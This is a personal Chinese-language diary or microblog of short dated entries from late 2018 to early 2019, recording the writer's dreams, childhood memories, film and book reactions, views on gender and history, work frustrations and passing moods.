<p>2018-11-18 23:16:30<br>村上龙的《孤独美食家》如果是纪实的话，那这个人倒也很诚实，也很敢写，可以说对自己的私生活很坦诚了。鱼子酱就是腌制的鱼卵吗？这样我才想起小时候吃过鱼卵，是吃红烧鱼吃到的，但是是在鱼肚里面忘了清理掉的鱼卵，我那时候还很喜欢吃，不知道腌制过后是什么味道。松露到底是什么呢？似乎是一种很好吃，但是吃完之后会带来强烈失落感的美食。说到失落感，凡是经历过快乐之后，到了快乐的最后期限时都会有的吧。就像书里写的，吃完美食，看到空落落的餐盘的那种心情一样。人在快乐的时候，就会忘掉悲伤，但有时候是不是也会在快乐的空隙里，为自己暂时搁置的悲伤感到愧疚呢？这个悲伤也许是替自己悲伤，也可能是替朋友或家人悲伤。</p>
</blockquote>
<blockquote>
<p>2018-11-18 23:43:24<br>除了钱，我希望你看看它背后的一切。</p>
</blockquote>
<blockquote>
<p>2018-11-18 23:54:48<br>现在回想起初中时给我留下最深印象的是经过弯折楼梯这种特殊空间后的钢琴声，那时上音乐课的天气好像都特别晴朗，阳光很好，一边爬上楼梯，钢琴声也越来越近。对于钢琴琴键的黑白配色也有种很熟悉的钟爱的感情。那个音乐老师应该是我遇到过的最漂亮也最温柔的老师。</p>
</blockquote>
<blockquote>
<p>2018-11-18 23:59:06<br>我们都是一边说着不要以貌取人，一边被外貌烙刻下的印象左右着判断。</p>
</blockquote>
<blockquote>
<p>2018-11-19 11:48:19<br>昨天晚上做了一个很可怕的梦，我梦见my brother died for me. and so many snakes. i felt sorrowful for the selfness of human in my dream yesterday. </p>
</blockquote>
<blockquote>
<p>2018-11-20 00:04:45<br>现在，是最神秘的时刻，它是过去的未来，是未来的过去，那它自己到底是什么，有没有存在过？</p>
</blockquote>
<blockquote>
<p>2018-11-20 23:32:44<br>每一天都有好多好多感慨，特别多想说的，留到晚上睡觉之前的空隙，就挤满了脑袋。</p>
</blockquote>
<blockquote>
<p>2018-11-21 21:09:06<br>如果哪天你看到我的眼睛变成双眼皮，那就说明我已经累到不行了。</p>
</blockquote>
<blockquote>
<p>2018-11-21 23:44:32<br>减少依赖，切记！</p>
</blockquote>
<blockquote>
<p>2018-11-21 23:55:35<br>突然想起很小的时候看《王子变青蛙》还真的以为明道最后会变成青蛙，看了好久都没变身还觉得纳闷儿。</p>
</blockquote>
<blockquote>
<p>2018-11-22 22:40:03<br>明天的事留着明天操心去吧，我今天要睡个好觉。</p>
</blockquote>
<blockquote>
<p>2018-11-24 00:09:48<br>只要还肯学习，就有救。我相信自己还有救。</p>
</blockquote>
<blockquote>
<p>2018-11-24 11:10:38<br>昨天晚上做的梦都让人心酸，i hate gamblers.</p>
</blockquote>
<blockquote>
<p>2018-11-24 14:06:50<br>中午先后看到一个小男孩和一个小女孩在撕心裂肺地哭泣，不知道是为什么而哭。在人们是小孩子的时候，情绪可以忘情地表达，而随着年纪增长，不得不把情绪藏起来，关掉那些显性的情绪出口，扮演懂事的角色，这可能就是越长大越不快乐的原因吧。</p>
</blockquote>
<blockquote>
<p>2018-11-24 21:34:24<br>草好像是专门供人践踏而存在的，而花的命运就好了不知多少，最不济也会被人摘下来观赏，谁会把草捧在手上。</p>
</blockquote>
<blockquote>
<p>2018-11-24 22:38:10<br>在当权者眼里群众到底是什么？泉港碳九泄露也好，非典也好，做事的风格怎么还是这样？封锁真相真的只是为了避免民众恐慌？还是为了平息自己的恐慌？遇事就躲的习惯还得改一改哦。从群众中来，到群众中去。这句话可不要只是说说而已哦。做人不要忘本。</p>
</blockquote>
<blockquote>
<p>2018-11-27 13:13:48<br>如果百分之九十九的人说的是谎话，你选择相信剩下的百分之一讲的真话吗。</p>
</blockquote>
<blockquote>
<p>2018-11-28 01:18:09<br>这几句话应该昨天说的，太忙了现在才说。前天晚上我梦到妈妈很凶地骂我，昨天晚上就接到她的电话，接着开始骂我。</p>
</blockquote>
<blockquote>
<p>2018-11-29 00:19:58<br>有个人说说话其实是很难得的事。</p>
</blockquote>
<blockquote>
<p>2018-11-29 01:07:48<br>神经已经持续两个月高度紧张。两个月big aunt没找我。</p>
</blockquote>
<blockquote>
<p>2018-11-29 13:55:13<br>越是想死的时候越要勇敢地活下去。</p>
</blockquote>
<blockquote>
<p>2018-11-30 00:30:30<br>明天早上我要气定神闲地出门，数一下到地铁站到底经过几个红绿灯路口。</p>
</blockquote>
<blockquote>
<p>2018-11-30 13:05:14<br>中国的基因编辑婴儿诞生，人类离生化危机已经不远了。这两个女孩的人生注定坎坷，真是可悲。</p>
</blockquote>
<blockquote>
<p>2018-11-30 13:20:19<br>如果遇到危险只求自保，就说明你已经被打败，是落荒而逃的表现。但是想长远一点呢？你跑了之后，你躲起来之后，危险就消失了吗？消灭危险最根本的方法是跳出狭小的个人世界，把自己作为整体的一个部分，与其他部分粘在一起，做成一件强大的兵器，和危险对抗。危险被击倒之后，再退回自己的小世界庆祝一下自己的勇敢。</p>
</blockquote>
<blockquote>
<p>2018-11-30 20:33:38<br>假如有一天，全球断网，这个世界会不会乱套。</p>
</blockquote>
<blockquote>
<p>2018-12-03 01:31:38<br>先鼓励一下自己，明天一定要早起。</p>
</blockquote>
<blockquote>
<p>2018-12-05 00:15:38<br>看到空缺不要着急填补，缺的那个角留下的想象余地比完整的画面多多了。</p>
</blockquote>
<blockquote>
<p>2018-12-09 00:44:31<br>心气怎么这么高啊。但是没办法啊，根本改不了。也许这样，才证明我还活着。</p>
</blockquote>
<blockquote>
<p>2018-12-09 22:43:38<br>昨天晚上那个梦才叫做神奇，我梦到一个男的怀了个大肚子，之后他把那一大坨移植到我身上，我竟然在梦里生了个小孩，她还竟然是我妹妹，叫余灿然。在生孩子的过程中我清晰地感受到羊水破了。简直是个丧心病狂的梦。</p>
</blockquote>
<blockquote>
<p>2018-12-10 23:55:52<br>PM, my goal.</p>
</blockquote>
<blockquote>
<p>2018-12-12 12:37:40<br>有什么不能直接说吗？为什么要体现出你的身份多么正式？有身份了不起啊？</p>
</blockquote>
<blockquote>
<p>2018-12-12 21:41:52<br>凭什么质问我，素质真是不配身份。所以认识一个人，要把他身上带的标识剥掉，就看这个人，不要被他所属的群体留下的固有印象左右判断。</p>
</blockquote>
<blockquote>
<p>2018-12-16 19:46:22<br>昨天晚上梦到李小璐和贾乃亮还是很恩爱啊。</p>
</blockquote>
<blockquote>
<p>2018-12-17 22:11:22<br>我承认我很自我，我承认我管不住嘴，我承认我三分钟热度，我承认我不是想象中的我，我承认我还是没那么喜欢孤独，我承认我分不清楚界限，太多模糊的边界，我不知道自己属于哪一块，我承认我没有归属感就像没有魂魄，我承认我不是期待的我，我承认心中住有恶魔，我承认我压抑它们也是在压抑我自己，我承认有时想做个坏人，我承认我现在乱的很，这虚无的人生，我控制我的行动，控制我的思想，控制我的语言，有时候又想把控制权放弃，但是放弃之后，我又属于谁。我到底是谁，谁在控制我的大脑，很多时候我都怀疑我的行为真的受思想控制吗，有时候会有种思想控制不住行为的焦虑。很多很多次，早上起床之前，我感觉自己都已经不属于这个空间，因为我的想法控制不了我的行为，我想爬起来，但是又想继续睡个懒觉，在这两个念头的博弈中，大多数还是睡懒觉胜出。总是在这个过程中折腾大脑。我害怕深入思考一个问题，总觉得脑袋承受不住那么大的负荷。我不记得小时候是不是有过绞尽脑汁的思考过什么问题，总是害怕那种大脑超荷载的结果。我不知道为什么写这些乱七八糟的，可能第二天看到恨不得扇自己巴掌的东西，就当作是意识的记录吧。今天做了最难吃的银耳汤，现在都还很撑。如果没有一些普遍的人生目标模板，我是不是就像一粒灰尘随着风随着阳光胡乱飘荡。但是有那些人生模板又如何呢，就像想象自己成为富婆，也不一定能实现。可能一切的目标，都是在自圆其说，为自己的存在找出意义，尽管多你一个少你一个，世界也不会有什么变化，地球照常运转，太阳照常升起。好像一滴雨，不能决定它能落在哪里，但是它心里的目标一定是要去爱的人身边，不然就只是一滴水，普普通通的一滴水，没有灵魂的一滴水。没有目标，顺其自然的人生和一粒灰尘又有什么分别。或许，目标便是作为人类，与无常的命运的一场较量，也是一种抵抗。当人们感叹人生无常的时候，就已经缴械投降了。我承认我说的这些废话不着边际，但是人们喜欢浩瀚无垠的大海，为什么又会厌烦漫无边际的人生，漫无边际的絮语。目的性太强是不是又是一种对自己的禁锢，你选定了这个，就意味着放弃了那个。把自己捆绑到一个自己喜欢的漂亮的壳里面似乎是很多人的人生目标。但是话说回来，再光鲜再优秀的人何尝不是生活在壳里面，优秀的人聚集在一个壳里，差劲的人聚集在一个壳里，平庸的人挤在狭小的壳里，平庸的人里面又有一部分上进的人想要挤进优秀的人所属的漂亮的宽敞的壳。思想暂停的一刹那，似乎时间并没有往前走。如果说世界是四维的存在，那我们的生命就是一个缩小版的思维体，我们的身体构成一个内部空间，与外部的空间和时间一起延伸。对啊，时间和空间不就是在不断延伸吗？四维体之间的交叉错综复杂，彼此有时间和空间的牵连。我在床上，车在楼下的街道穿过，此时我所置身的世界和车开过的那一瞬间产生交点，但是我和开车的人并不认识，我也不知道开车的人是谁。很多事情同时发生着，但是真的是同时吗？为什么国家有时差，而我和周围的环境没有时差呢？我觉得有时差，世界上的每一个地理坐标点之间都应该有时差的。你说，中国和美国相差8小时，那这8小时是怎么算的？难道是从中国的边境到美国的边境算的吗？那中国这片土地上，四川和北京也有时差，凡是有距离的事物之间都存在时差。但是人又不是地标，人是动态的点，人与人之间的时差计算起来可就复杂了。先说这么多。还有很多很多想说的。</p>
</blockquote>
<blockquote>
<p>2018-12-18 19:53:49<br>现在对“流程”这两个字犯恶心，第一次遇到这么刁钻的人。真的很想爆粗。很想罢工。但是想想，这也是正常现象，不管什么群体，都有恶心的人。</p>
</blockquote>
<blockquote>
<p>2018-12-20 00:25:03<br>我还是我。</p>
</blockquote>
<blockquote>
<p>2018-12-20 22:54:37<br>一旦同样的错误犯了两次，我就无法原谅自己。</p>
</blockquote>
<blockquote>
<p>2018-12-23 16:55:57<br>贪婪是不对的。</p>
</blockquote>
<blockquote>
<p>2018-12-24 18:59:40<br>今日关键词：闭门羹。多的就不想说了。</p>
</blockquote>
<blockquote>
<p>2018-12-25 22:42:00<br>想想已经很久没玩剪刀石头布的游戏啦。</p>
</blockquote>
<blockquote>
<p>2018-12-26 14:04:52<br>推算黄历的人有没有算到世界末日呢？</p>
</blockquote>
<blockquote>
<p>2018-12-27 12:22:23<br>昨天晚上电梯死活不开，今天早上没等我按就自己开了，简直神奇。</p>
</blockquote>
<blockquote>
<p>2018-12-28 23:49:25<br>穿套头衣服戴上帽子，只露半张脸，很酷。</p>
</blockquote>
<blockquote>
<p>2018-12-30 00:50:42<br>如果雪不化就好了。</p>
</blockquote>
<blockquote>
<p>2018-12-31 00:19:33<br>彩虹色的雨。</p>
</blockquote>
<blockquote>
<p>2018-12-31 00:36:39<br>想玩荡秋千，丢沙包。</p>
</blockquote>
<blockquote>
<p>2019-01-01 05:00:07<br>两女一男，一个使劲作，一个拼命装，一个大傻叉。</p>
</blockquote>
<blockquote>
<p>2019-01-02 00:05:25<br>“日子充满变数，但未来终究会是美好的。”</p>
</blockquote>
<blockquote>
<p>2019-01-02 00:11:04<br>还有什么比爱更有意义。</p>
</blockquote>
<blockquote>
<p>2019-01-02 00:26:34<br>小时候很喜欢橡皮擦的香味。</p>
</blockquote>
<blockquote>
<p>2019-01-02 12:26:34<br>要理解一个人谈何容易，除非杀死自己，过一遍别人的生活。</p>
</blockquote>
<blockquote>
<p>2019-01-02 12:28:26<br>《生命的河流》小舟</p>
</blockquote>
<blockquote>
<p>2019-01-02 12:32:52<br>像蚂蚁一样，但是希望在最幸福的状态被凝固成琥珀，这样幸福就是永恒的了。幸福的状态都是一动不动的吧。</p>
</blockquote>
<blockquote>
<p>2019-01-02 12:39:11<br>就连雪白的A4纸都是有杀伤力的，第一次被一张A4纸划了一条口子。</p>
</blockquote>
<blockquote>
<p>2019-01-02 12:40:42<br>很多琐碎的记忆就像指甲，剪掉并不觉得可惜。</p>
</blockquote>
<blockquote>
<p>2019-01-02 22:17:23<br>不倒翁。</p>
</blockquote>
<blockquote>
<p>2019-01-03 00:01:10<br>make a star a day.</p>
</blockquote>
<blockquote>
<p>2019-01-03 00:03:53<br>good light, white wall and easy life with the atmosphere of love.</p>
</blockquote>
<blockquote>
<p>2019-01-03 18:34:15<br>皮蛋瘦肉粥真的超好吃。</p>
</blockquote>
<blockquote>
<p>2019-01-03 18:35:32<br>今天中午一个女的点个面条都像在上演一出戏，作得哟，不得了。</p>
</blockquote>
<blockquote>
<p>2019-01-04 23:43:17<br>桑右的失乐园不过就是在海上自由飘荡，18岁那年犯的错，弟弟千夫也承受了将近半辈子。用仇恨来攻击愧疚，真的不是另一种形式的错误吗？法拉的失乐园应该就是在丛林和海边自由地跳舞吧，有个场景是她在街边盛装打扮欢快地跳舞被前同事认出的尴尬，和之后跟千夫、桑右一起快乐地跳舞形成极强的反差。法拉给失乐园的定义我很赞同，就是做自己喜欢做的事，不会打扰到其他人的地方。是的呀，桑右喜欢涂鸦，用指甲油给心爱的小乌龟涂上粉红色，那只乌龟就是他的象征啊，乌龟活着，他就活着（所以快结尾的那次事故，其实不是真相，他并没有跳海，只是一个人划着小船在海上玩去了），走路的姿势和乌龟的姿势也是重合的。而千夫的失乐园，就是找到爱的人吧，当然最后找到了。他们都找到了自己的失乐园，真好。这部电影的导演应该是个很善良的人吧。</p>
</blockquote>
<blockquote>
<p>2019-01-05 11:40:16<br>昨天晚上隔壁情侣大半夜又吵架。我就在想既然有这么多吵的，这么大矛盾，为什么还要一起挤在出租屋，还是合租房。在亲密关系里感受到的痛苦如果大于快乐，为什么还舍不得离开，好了伤疤忘了疼？</p>
</blockquote>
<blockquote>
<p>2019-01-06 00:55:45<br>《我心迷惘》结婚对男人来说意味着什么，好像就是晚上泄欲的工具，生育后代的机器，贴心专属保姆。男人为了事业冷落女人和孩子似乎理所应当，而女人想要追求自己的生活和事业竟然成了奢望。为什么男人的事业就比女人的事业重要吗？女人前期一边顾家带孩子操持家务，一边辛苦工作，但是在男人看来，女人工作就是不务正业，给他添乱。说白了，男人要的就是一个乖巧的宠物，圈养在家里，心情好了，再带出去炫耀。女人为了家庭牺牲事业，又得到什么？男人反而认为女人越来越憔悴。更气人的是，男人认为崇尚权利的女人没有魅力。这是什么话，不过是感到自己的稳稳的权利有了威胁吧，当然是觉得弱小的女人有魅力咯，这样才能轻松地站在权利高处，实现心中猥琐的崇高感。还好，结局是女人终于找回结婚前的原则感，提出离婚。只是很想念孩子。镜头的处理很美，孩子们用枫叶装饰汽车，车开起来，叶子随风飘落。就像女人堆积在心里的烦恼忧郁也一点点随风吹散了吧。</p>
</blockquote>
<blockquote>
<p>2019-01-06 23:33:53<br>《南极之恋》让我感动到流泪的竟然不是这部电影的主题“恋”。不知道为什么，看男女主困在南极，寻找极光站，这些过程中我却多次想笑，可能是因为心里很清楚他们是演员，并不是真正的科考人员吧。那种情境之下产生的感情好像特别容易感动人，生死之恋嘛。但是换个角度想想，如果不是一男一女困守在南极，共同想要活下去，那电影的主题还会是“恋”吗？或许也有可能做成同性恋题材吧。不管怎么说，困守南极的两个人是不是异性，脱离了困境之后，最好还是相忘于江湖。因为两个人的人生不可能因为有一个关乎生死的粘着点就完全同步。吴富春依然是只认钱包的土豪，荆如意还是那个一心钻研欧若拉（极光）的科考女。现实可能会残酷到忽略掉生死与共，谁说现实就不比南极的环境更恶劣？我认为庄子的话是对的，相濡以沫，不如相忘于江湖。至少，美好的生死与共仍然烙刻在记忆里，不会被现实的平淡或荒诞冲刷掉。看到最后的花絮，剧组拍摄和南极科考队待了几个月的时间，从剧组刚来的欢迎横幅到剧组杀青的送别，这些科考人员的心情又如何呢？剧组的人回去或许可以向身边的人讲讲在南极遇到的新鲜事和经历的特别之处，那也仅止步于猎奇，因为南极不是他们的归宿。而科考人员在迎接和欢送完剧组之后，等待他们的依然是冰天雪地，极昼极夜，雪崩冰裂，以及像雪地一样广袤无垠的寂寞。在男主找到极光站之前，整部影片除了女主没有看到其他人类，直到科考队的人出现，就连旁观者如我也感受到人的共同和温暖，就是终于有同类，终于有活着的希望的那种欣喜。所以，在the end of the world的时刻，人还是会靠近人，只是作为动物存活的本能。男女主的相濡以沫也是出于本能，无关爱情。</p>
</blockquote>
<blockquote>
<p>2019-01-07 00:04:16<br>爱情是什么呢？它就是一种病，一种沉溺在幻境的病。一旦一方的病好了，这段爱情也消失了。是病就会有痊愈的一天，除非癌症晚期，现实都无力回天。</p>
</blockquote>
<blockquote>
<p>2019-01-07 00:28:06<br>我见过同一个人，从十八九岁未婚变成婚后三十岁左右，过程怎么变化的我不知道，但我很清楚地知道这两种状态。</p>
</blockquote>
<blockquote>
<p>2019-01-07 09:12:11<br>公交车上遇到个奇葩大妈，非得站到我的前面，成功被她挤跑了。这是强行占位啊。</p>
</blockquote>
<blockquote>
<p>2019-01-07 20:29:06<br>一回来就想趴着不想动，但是做饭让我有精神。还有，吃完饭不想立即洗碗，就是那种空盘的失落感吧。</p>
</blockquote>
<blockquote>
<p>2019-01-07 22:58:44<br>有个段子说，有人做过一个统计，用苹果手机的，都是月薪3千到1万的，而用华为手机的，都是月薪超过1万的。所以我决定以后都用华为，看能不能月薪超过一万。</p>
</blockquote>
<blockquote>
<p>2019-01-08 12:44:42<br>对不朽有了理解。前辈留下的音乐诗歌书籍，只要是在完全真实的状态下创作的，总会引起空间磁场震荡，那些感情和状态就是磁芯。所以人们收藏情绪的方法就是创作。</p>
</blockquote>
<blockquote>
<p>2019-01-09 01:17:28<br>人都是立体的。女性真的应该好好感谢武则天。男人写的史书是把这位伟大的女性妖魔化了。此生一定要去看看无字碑。</p>
</blockquote>
<blockquote>
<p>2019-01-09 01:43:53<br>人都是渴望被理解的，可悲的是，不被理解才是宿命。</p>
</blockquote>
<blockquote>
<p>2019-01-09 01:49:44<br>命运往往很捉弄人，自己受过的苦，就极力让爱的人避免受类似的苦，但是每个人有他她该经受的苦难，好多时候就不按预期发展。当你费心费力想要为爱的人创建一个没有痛苦的世界时，他她极有可能奔向另一个未知的险境。矫枉过正大概是这个意思。</p>
</blockquote>
<blockquote>
<p>2019-01-09 01:50:52<br>逆天改命总会遭天谴吗？有时会陷入这种迷惑。</p>
</blockquote>
<blockquote>
<p>2019-01-10 01:11:16<br>男皇帝三宫六院七十二嫔玩弄抛弃之都司空见惯，而唯一女皇武则天只不过丧夫之后晚年寂寞宠幸了4个面首就被人诟病抹黑，更何况作为女人，对这些面首并非玩弄的心态，甚至都付出了极深的感情。薛怀义本是走江湖的小伙，他选择踏入武则天的帷幄，不过是为了荣华富贵，后来却也背叛，嫌弃厌倦了年老色衰。御医那个却是薛怀义一心监工修明堂天堂的间隙的替代品。及至武则天70岁左右，太平公主，也就是她亲生女儿为了讨她欢心，找了张昌宗和张易之兄弟献给她。晚年的武则天把所有的宠爱都放到了这两个极俊美如天使般的男孩身上，群臣上奏要抓二张兄弟时，武则天以女皇的权力护他俩周全。总之，女人拥有至高权力好过男人拥有至高权力。</p>
</blockquote>
<blockquote>
<p>2019-01-10 23:51:40<br>每天喝一碗自己做的粥就很开心。</p>
</blockquote>
<blockquote>
<p>2019-01-12 17:16:02<br>《云边有个小卖部》活生生把我看哭了。不知道张嘉佳在写这本小说的时候是什么状态，外婆和程霜对刘十三的爱很让人感动。很多种爱，不同的人之间的爱，牛大田对秦小贞的爱，毛婷婷对毛志杰的爱，智哥对刘十三的爱。生离死别真是揪心。除了生死，真的没有什么大事。</p>
</blockquote>
<blockquote>
<p>2019-01-13 10:54:50<br>早晨睁开眼睛起床之前，真的会有耳鸣。</p>
</blockquote>
<blockquote>
<p>2019-01-13 22:03:38<br>红豆鲫鱼汤√</p>
</blockquote>
<blockquote>
<p>2019-01-13 23:35:00<br>小学放学路上摔破膝盖，回家不敢说，怕挨骂。裙子染的血还是瞒不过妈妈的眼睛。</p>
</blockquote>
<blockquote>
<p>2019-01-14 00:03:57<br>单纯的爱和单纯的恨都不会让人难过，只是爱恨交织的感情真的很折磨人。</p>
</blockquote>
<blockquote>
<p>2019-01-14 00:39:12<br>为什么伤我最深的，爱我最多的，都是我最亲的人。</p>
</blockquote>
<blockquote>
<p>2019-01-15 23:00:42<br>很多事情都是这样，迈开了第一步，就不那么可怕，也不那么困难。</p>
</blockquote>
<blockquote>
<p>2019-01-16 19:06:17<br>昨天晚上我在梦里偷看了别人的日记，竟然也很心慌。</p>
</blockquote>
<blockquote>
<p>2019-01-19 12:48:05<br>昨天晚上做梦硬是变身女主把刚看完的悲剧电影上演了一遍。</p>
</blockquote>
<blockquote>
<p>2019-01-19 16:20:03<br>没有看戏的人，戏台子搭不起来。</p>
</blockquote>
<blockquote>
<p>2019-01-22 22:54:37<br>昨天晚上的梦就是部灾难片，山崩，狂风，黑夜，士兵，刺刀，头颅，西瓜。我是第二个被杀的，做梦的时候竟然都被吓得不敢出声，刺刀一刀劈在我头上，之后又看到另外几个人的头像西瓜一样被切破。梦到了多年没见的老朋友，居然是这种场面，大家一起死的场面。</p>
</blockquote>
<blockquote>
<p>2019-01-24 23:45:34<br>html也太好耍了吧。我要建一个属于自己的漂亮的网页。嗯。决定了。</p>
</blockquote>
<blockquote>
<p>2019-01-28 13:09:31<br>大清早的，你说成都话就很拽啊，嘴巴像放炮一样噼里啪啦的，哪个听得懂。第一，请说清楚who are you .第二，说清楚what’s your problem.第三，保持礼貌，我谢谢您。.</p>
</blockquote>
<blockquote>
<p>2019-01-29 19:07:18<br>昨天是第一次夜不归宿，献给了我亲爱的工作，然后今年轻而易举得到两张敬业福，这说明什么。</p>
</blockquote>
<blockquote>
<p>2019-01-30 23:03:02<br>贪婪的人，多疑的人，严禁越界。</p>
</blockquote>
<blockquote>
<p>2019-02-02 02:11:57<br>楚楚衣冠之下暗涌的一部部欲望狂想曲。</p>
</blockquote>
<blockquote>
<p>2019-02-02 11:30:58<br>如果说男人追求权利是为了征服，那么女人追求权利仅仅是为了安全感。</p>
</blockquote>
<blockquote>
<p>2019-02-07 21:09:27<br>钱可以使人闭嘴，真有意思。</p>
</blockquote>
<blockquote>
<p>2019-02-07 21:41:08<br>烟花不会静止，美丽不会停留，幸福不会定格。这一切美好存在的价值仅仅是供人想念，想念也是美好的佐证。</p>
</blockquote>
<blockquote>
<p>2019-02-08 13:24:35<br>醉醉的，等一上午都没电话，偏偏吃饭的时候来电话，静音没接到。</p>
</blockquote>
<blockquote>
<p>2019-02-11 22:19:42<br>路边树上的彩灯，按给定规律闪烁着，就像努力逗人开心的跳舞机器人。</p>
</blockquote>
<blockquote>
<p>2019-02-11 22:40:04<br>帅气女生的吸引力大于coolboy.</p>
</blockquote>
<blockquote>
<p>2019-02-14 12:44:47<br>昨晚梦录：W，樱桃；toilet，核桃壳；bro，充满抱怨和文采的长句条幅；ME，take shower，so cold，bare body；morning，be late；吓醒。</p>
</blockquote>
<blockquote>
<p>2019-02-14 22:00:31<br>看到别人幸福，我也觉得好幸福。</p>
</blockquote>
<blockquote>
<p>2019-02-15 09:08:05<br>衣服鞋子的品牌logo特别显眼的时候，穿着的人真像行走的广告牌。</p>
</blockquote>
<blockquote>
<p>2019-02-19 22:32:32<br>人生中第一次送花给自己，是雏菊。New Life.</p>
</blockquote>
<blockquote>
<p>2019-02-20 13:59:24<br>昨晚残梦：大海，凌波微步。还有很多记不得了，不过记得在梦里玩得很开心。</p>
</blockquote>
<blockquote>
<p>2019-02-20 21:42:06<br>“哭着吃过饭的人，是可以坚强活下去的”。想想自己，不是爱哭的人，但是在家里有好几次都哭着吃过饭。</p>
</blockquote>
<blockquote>
<p>2019-02-24 22:17:43<br>路怎么这么滑，今年第二摔。。。。旧伤未愈，又添新伤</p>
</blockquote>
<blockquote>
<p>2019-02-26 23:45:29<br>男性女化，女性男化，大家都在朝中性发展嘛。儒家提倡的中庸之道怎么一直都不太接受这种中性化的必然趋势呢。</p>
</blockquote>
<blockquote>
<p>2019-02-28 09:29:49<br>说白了人们是成功的粉丝，特别丑的人获得成就之后都会有些盲目的人说他帅。成功竟然到了可以颠覆美丑的地步，审美怎么变得这么随便。反正我看到一个丑的人是夸不出帅的。</p>
</blockquote>
<blockquote>
<p>2019-02-28 22:30:39<br>这个月竟然没催我交房租，真的是因为没有30号就不用交了吗？哈哈哈，反正这个月是不交了。</p>
</blockquote>
<blockquote>
<p>2019-02-28 22:37:56<br>小时候，懒得算题，就把题目拿去考妈妈，在她发现之前得逞了好几回，轻轻松松得出答案。</p>
</blockquote>
<blockquote>
<p>2019-02-28 23:07:06<br>我没说，并不代表我忘了。</p>
</blockquote>
<blockquote>
<p>2019-02-28 23:18:00<br>最近好像变笨了，思维混乱，脑袋一团浆糊。每次事情乱如麻的时候，都习惯性的让这些事情在脑袋里发酵，就像脏衣服一件件堆起来的时候，总是很懒地放置一段时间，堆到一个极限值之后，才肯劝自己耐心地整理。这是种什么心理呢？</p>
</blockquote>
<blockquote>
<p>2019-03-01 23:38:05<br>感觉我的人生就是这么误打误撞过来的。</p>
</blockquote>
<blockquote>
<p>2019-03-03 00:07:37<br>我曾经也想过把自己的经历写进小说里，让所有的不完满都完满。等我真的开始动笔的时候就说明现状已经非常不完满了吧。希望这一天不要到来，因为现实和想象差距太大的时候，人格分裂成两半，进而沉浸到完美的想象中，在现实里承受落差带来的煎熬。</p>
</blockquote>
<blockquote>
<p>2019-03-03 19:48:12<br>翻了另一个qq号，看到以前的朋友们发的动态，真是受到一万点暴击，或许我只能孤独终老了。</p>
</blockquote>
<blockquote>
<p>2019-03-03 22:40:36<br>我可真是个知心姐姐。</p>
</blockquote>
<blockquote>
<p>2019-03-04 22:31:11<br>没有配乐的舞，是不存在的。</p>
</blockquote>
<blockquote>
<p>2019-03-04 22:52:53<br>手指就差一点抽筋了，点点点。</p>
</blockquote>
<blockquote>
<p>2019-03-05 13:32:35<br>看到你的傻，有企图心的人会想尽办法利用你，而爱你的人，不忍心破坏这份傻劲，甘愿挡在前面守护你。</p>
</blockquote>
<blockquote>
<p>2019-03-05 13:52:40<br>时间又何曾放缓过它的脚步，为谁停留哪怕一刻。</p>
</blockquote>
<blockquote>
<p>2019-03-06 09:11:48<br>什么事情都要抢，这是资源紧缺培养的习惯。</p>
</blockquote>
<blockquote>
<p>2019-03-06 09:13:03<br>你有太多不切实际的梦想，根源在于无知，对这个世界无知，对自己的无知。</p>
</blockquote>
<blockquote>
<p>2019-03-07 23:06:37<br>焦虑的人卖掉过剩的焦虑，换来的钱就是快乐。快乐的人卖掉溢出的快乐，换来的钱拿去买点新鲜的哀愁。</p>
</blockquote>
<blockquote>
<p>2019-03-07 23:10:07<br>现在根本就不存在，人的一生就在过去和未来形成的通道里穿行。</p>
</blockquote>
<blockquote>
<p>2019-03-09 03:44:54<br>曾经受过的伤害让我们形成一套独有的自我保护机制，根据经验对外界做出的反应，通常是害怕揭开旧疤的新痛。而当一个人的反应或者行为过于变态的时候，就应该给他她一个拥抱了，因为他她一定是受到过超出常规的伤害而做出的惯性抵抗。</p>
</blockquote>
<blockquote>
<p>2019-03-10 11:35:36<br>想一直就这么颓下去，落到无底的地狱，看一眼极限，黑洞的底端真的还是漆黑一片吗？</p>
</blockquote>
<blockquote>
<p>2019-03-11 21:34:03<br>昨晚上做梦，竟然梦到自己养了一条蛇当宠物，它的尾巴就像鱼一样，在一个特质的凹槽里面爬行，在梦里我竟然没有感到害怕，这是前所未有的。前所未有的，那份恐惧消失了。曾经最怕的东西，竟成了我的宠物，不可思议，不可思议啊。</p>
</blockquote>
<blockquote>
<p>2019-03-11 21:51:15<br>功能性消化不良？我发誓再也不吃土豆了。</p>
</blockquote>
<blockquote>
<p>2019-03-15 03:49:48<br>开心开心，我的facebook，youtube都装好啦，终于可以连上国际互联网了，真的不容易啊。之前装了office2010的流氓版，搞了好久才卸载干净，删注册表删得手抽筋。发誓不再安装流氓软件，这次装的office2019，发现了新大陆，希望可以creat something new.</p>
</blockquote>
<blockquote>
<p>2019-03-15 03:53:34<br>instagram用来存照片，谷歌浏览器真的好用啊，以前怎么就没想过呢。</p>
</blockquote>
<blockquote>
<p>2019-03-16 20:52:41<br>昨天晚上做了很开心的梦，在梦里面，我看到蓝天和白云构成特别特别美的画面，我手里面拿着的好像是一朵什么花或者别的东西，使劲向前跑，好像跑着跑着就能追到天上的白云和太阳。</p>
</blockquote>
<blockquote>
<p>2019-03-16 21:01:54<br>沙雕欢乐多。</p>
</blockquote>
<blockquote>
<p>2019-03-17 01:26:19<br>沙漠芙蓉，沙漠雪景，黑暗是光的守护者。</p>
</blockquote>
<blockquote>
<p>2019-03-17 23:45:13<br>play heart to get.There are many fish in the sea.follow your heart, do what you love.keep your friends close, keep your enemies closer.don’t wait the chance, just make it.happiness is the most important thing in our lives, so many things can not be measured by money.今天的冲动，放到明天满足，将失去意义。今天的不高兴，明天被关注，同样没有意义。遗憾从来无法弥补。早夭的婴儿永不复生。</p>
</blockquote>
<blockquote>
<p>2019-03-19 01:56:34<br>恶性循环，我会不会死掉。</p>
</blockquote>
<blockquote>
<p>2019-03-19 02:07:10<br>nobody, there is nobody except me myself. i ‘m just like a boat floating on the sea and the sea is so peaceful that i feel scared.</p>
</blockquote>
<blockquote>
<p>2019-03-19 20:48:39<br>午休，做梦，梦里体验到坐跳楼机和过山车的那种失重惊险刺激。</p>
</blockquote>
<blockquote>
